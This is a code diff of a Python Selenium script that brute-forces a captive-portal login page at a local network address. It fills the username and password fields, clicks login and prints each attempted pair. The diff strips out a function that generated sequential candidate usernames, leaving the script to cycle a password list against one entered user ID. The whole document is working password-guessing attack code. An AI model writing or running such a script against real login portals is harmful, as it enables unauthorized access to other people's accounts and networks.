@@ -1,8 +1,6 @@
 from selenium import webdriver
 from selenium.common.exceptions import NoSuchElementException
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.chrome.options import Options
-import time
+
 _UserList = []
 _PasswordList = []
 user_cnt = 0
@@ -10,16 +8,7 @@ pass_cnt = 0
 _UserList.append(str(input("Enter UserID:")))
 browser = webdriver.Chrome("/chromedriver.exe")
 
-
 browser.get("http://192.168.50.1/portal/user-authen.php")
-
-
-def create_user():
-    for v in range(1, 10):
-        for w in range(10):
-            for x in range(10):
-                string = "c3-{}{}{}".format(v, w, x)
-                _UserList.append(string)
 
 
 def create_pass():
@@ -40,7 +29,6 @@ while True:
         print("Try:" + _UserList[user_cnt], _PasswordList[pass_cnt])
         _UserForm.clear()
         _PassFrom.clear()
-        # _UserForm.send_keys(str(_UserList[user_cnt]))
         _UserForm.send_keys(str(_UserList[0]))
         _PassFrom.send_keys(str(_PasswordList[pass_cnt]))
         _LoginButt.click()
